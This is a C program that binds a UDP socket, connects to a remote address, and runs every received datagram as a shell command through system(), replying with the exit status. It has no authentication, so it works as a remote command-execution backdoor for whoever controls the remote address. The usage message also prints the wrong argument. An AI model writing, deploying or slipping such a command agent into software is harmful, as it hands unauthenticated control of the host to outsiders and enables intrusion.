#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFSIZE 1024
static int check_port(const char *s) {
    // strtol() would also accept leading whitespace and +, - signs
    if (!isdigit((unsigned char)s[0]))
        return -1;

    char *end;
    errno = 0;
    long v = strtol(s, &end, 10);
    if (errno != 0 || *end != '\0' || v < 1 || v > 65535)
        return -1;
    return (int)v;
}

static int check_IP_version(const char *ip, int port, struct sockaddr_storage *addr, socklen_t *len) {
    struct sockaddr_in  *addr4 = (struct sockaddr_in *)addr;
    struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)addr;

    memset(addr, 0, sizeof(*addr));
    if (inet_pton(AF_INET, ip, &addr4->sin_addr) == 1) {
        addr4->sin_family = AF_INET;
        addr4->sin_port = htons((uint16_t)port);
        *len = sizeof(*addr4);
        return 0;
    }

    memset(addr, 0, sizeof(*addr));
    if (inet_pton(AF_INET6, ip, &addr6->sin6_addr) == 1) {
        addr6->sin6_family = AF_INET6;
        addr6->sin6_port = htons((uint16_t)port);
        *len = sizeof(*addr6);
        return 0;
    }

    return -1;
}

int main(int argc, char** argv){
  if(argc != 5){
    fprintf(stderr, "Usage: %s <local IP address > <local PORT> <client IP addres> <client PORT number>\n",argv[1]);
    exit(EXIT_FAILURE);
  }

    int local_port = check_port(argv[2]);
    if (local_port < 0) {
        fprintf(stderr, "[-]PORT (must be 1-65535)\n");
        exit(EXIT_FAILURE);
    }
    int client_port  = check_port(argv[4]);
    if (client_port < 0) {
        fprintf(stderr, "[-]PORT (must be 1-65535)\n");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_storage local_addr, client_addr;
    socklen_t local_addr_len, client_addr_len;

    if (check_IP_version(argv[1], local_port, &local_addr, &local_addr_len) < 0) {
        fprintf(stderr, "[-] Invalid local IP address\n");
        exit(EXIT_FAILURE);
    }
    if (check_IP_version(argv[3], client_port, &client_addr, &client_addr_len) < 0) {
        fprintf(stderr, "[-] Invalid server IP address\n");
        exit(EXIT_FAILURE);
    }
    if (client_addr.ss_family != local_addr.ss_family) {
        fprintf(stderr, "[-] Local IP and server IP must be the same version (both IPv4 or both IPv6)\n");
        exit(EXIT_FAILURE);
    }

    
    int sockfd = socket(local_addr.ss_family, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("[-] SOKCET");
        exit(EXIT_FAILURE);
    }

    
    if (bind(sockfd, (struct sockaddr *)&local_addr, local_addr_len) < 0) {
        perror("[-] BIND");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    if (connect(sockfd, (struct sockaddr *)&client_addr, client_addr_len) < 0) {
        perror("[-] CONNECT");
        close(sockfd);
        exit(EXIT_FAILURE);
    }

    {
        char discard[BUFFSIZE];
        while (recv(sockfd, discard, sizeof(discard), MSG_DONTWAIT) >= 0)
            ;
     }

    while(1) {
    char buff[1024];
    ssize_t n = recvfrom(sockfd, buff, sizeof(buff) - 1, 0,
                          (struct sockaddr *)&client_addr, &client_addr_len);
    if (n < 0) {
        perror("recvfrom (IPv4/UDP)");
        close(sockfd);
        return -1;
    }
    buff[n] = '\0';
    int cmd = system(buff);

      if(cmd == -1){
      perror("[-]cmd\n"); // this error cause by settting buffer to cmd.
     }else if(WIFEXITED(cmd) && WEXITSTATUS(cmd) != 0){
        char err_msg[128];
        snprintf(err_msg, sizeof(err_msg), 
        "Error: Command failed with exit status %d\n", WEXITSTATUS(cmd));
        sendto(sockfd, err_msg, strlen(err_msg), 0,
        (struct sockaddr *)&client_addr, client_addr_len);
      } else {
        const char *success_msg = "Success: Command executed with status 0.\n";
        sendto(sockfd, success_msg, strlen(success_msg), 0,
               (struct sockaddr *)&client_addr, client_addr_len);
      }
     
    }
  close(sockfd);

 return 0;
}
